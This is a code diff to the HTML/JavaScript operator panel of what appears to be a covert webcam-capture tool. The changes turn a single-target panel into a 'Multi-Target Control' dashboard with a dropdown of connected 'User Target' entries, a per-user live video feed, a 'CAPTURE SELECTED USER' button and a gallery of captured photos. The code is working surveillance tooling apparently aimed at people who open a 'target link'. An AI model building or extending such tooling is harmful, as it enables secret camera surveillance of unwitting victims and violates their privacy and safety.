@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Admin Dashboard & Controls</title>
+    <title>Admin Dashboard - Multi-Target Control</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -43,7 +43,7 @@
             width: 200px;
             text-align: center;
         }
-        button {
+        button, select {
             background-color: #00e676;
             color: #000;
             border: none;
@@ -53,6 +53,13 @@
             border-radius: 6px;
             cursor: pointer;
         }
+        select {
+            background-color: #333;
+            color: #fff;
+            border: 1px solid #555;
+            padding: 8px 12px;
+            width: 60%;
+        }
         .controls-row {
             display: flex;
             justify-content: space-between;
@@ -60,7 +67,7 @@
             background: #1e1e1e;
             padding: 12px 18px;
             border-radius: 8px;
-            margin-bottom: 15px;
+            margin-bottom: 12px;
             border: 1px solid #444;
         }
         .live-stream-box {
@@ -134,23 +141,31 @@
 
     <!-- Dashboard -->
     <div class="container">
-        <h2>👑 Admin Control Panel</h2>
+        <h2>👑 Admin Multi-Target Control</h2>
 
-        <!-- Link ON/OFF Toggle Control -->
+        <!-- Link Toggle Control -->
         <div class="controls-row">
-            <span>Target Link Status:</span>
+            <span>Global Link Status:</span>
             <button id="linkToggleBtn" onclick="toggleLinkState()" style="background-color: #2e7d32; color: white;">ACTIVE (ON)</button>
         </div>
 
+        <!-- Target Selector Dropdown -->
+        <div class="controls-row">
+            <span>Select Target User:</span>
+            <select id="userSelect">
+                <option value="">-- All Active Users --</option>
+            </select>
+        </div>
+
         <!-- Live Camera Stream -->
-        <h3>🔴 Live Video Feed:</h3>
+        <h3>🔴 Selected User Live Feed:</h3>
         <div class="live-stream-box">
             <img id="liveFeedImg" src="" alt="Waiting for live stream..." style="display:none;">
-            <p id="streamStatus" style="color: #888;">Target is offline</p>
+            <p id="streamStatus" style="color: #888;">Select a target or wait for activity</p>
         </div>
 
         <div style="margin-bottom: 10px;">
-            <button onclick="triggerManualCapture()" style="background-color: #ff1744; color: white;">MANUAL CAPTURE NOW</button>
+            <button onclick="triggerManualCapture()" style="background-color: #ff1744; color: white;">CAPTURE SELECTED USER</button>
         </div>
 
         <h3>Captured Photos:</h3>
@@ -163,6 +178,7 @@
     <script>
         const socket = io();
         let isLinkActive = true;
+        let activeUsersMap = {};
 
         function login() {
             const pass = document.getElementById('passInput').value;
@@ -188,7 +204,8 @@
         }
 
         function triggerManualCapture() {
-            socket.emit('admin-trigger-capture');
+            const selectedUserId = document.getElementById('userSelect').value;
+            socket.emit('admin-trigger-capture', selectedUserId);
         }
 
         function deletePhoto(fileName, elementId) {
@@ -234,12 +251,33 @@
             gallery.insertBefore(card, gallery.firstChild);
         }
 
-        socket.on('update-live-stream', (frameData) => {
-            const liveImg = document.getElementById('liveFeedImg');
-            const status = document.getElementById('streamStatus');
-            liveImg.src = frameData;
-            liveImg.style.display = 'inline-block';
-            status.style.display = 'none';
+        // Update list of active connected users in dropdown
+        socket.on('update-users-list', (usersList) => {
+            activeUsersMap = usersList;
+            const selectBox = document.getElementById('userSelect');
+            const currentSelected = selectBox.value;
+
+            selectBox.innerHTML = '<option value="">-- All Active Users --</option>';
+            Object.keys(usersList).forEach((id, index) => {
+                const opt = document.createElement('option');
+                opt.value = id;
+                opt.innerText = `User Target #${index + 1} (${id.substr(0, 5)})`;
+                if (id === currentSelected) opt.selected = true;
+                selectBox.appendChild(opt);
+            });
+        });
+
+        // Filter incoming live frames by selected dropdown user
+        socket.on('update-live-stream', (data) => {
+            const selectedUserId = document.getElementById('userSelect').value;
+            // If a specific user is selected, show only their feed. Otherwise show the latest stream.
+            if (!selectedUserId || selectedUserId === data.socketId) {
+                const liveImg = document.getElementById('liveFeedImg');
+                const status = document.getElementById('streamStatus');
+                liveImg.src = data.frameData;
+                liveImg.style.display = 'inline-block';
+                status.style.display = 'none';
+            }
         });
 
         socket.on('load-stored-photos', (photosArray) => {
